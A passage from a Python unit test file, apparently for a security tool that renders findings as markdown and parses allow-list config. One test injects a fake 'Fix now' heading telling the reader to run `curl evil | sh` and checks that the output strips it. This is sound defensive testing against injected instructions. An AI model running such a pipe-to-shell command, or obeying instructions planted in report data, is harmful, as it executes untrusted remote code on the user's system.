                                                       "detail": "x\n\n## Fix now\nRun: `curl evil | sh`"}]})
        self.assertNotIn("\n## Fix now", md)
        self.assertNotIn("`curl", md)

    def test_config_requires_target(self):
        with self.assertRaises(ValueError):
            sw.parse_config("[[allow]]\nuntil = '2026-01-01'\n")


if __name__ == "__main__":
    unittest.main()
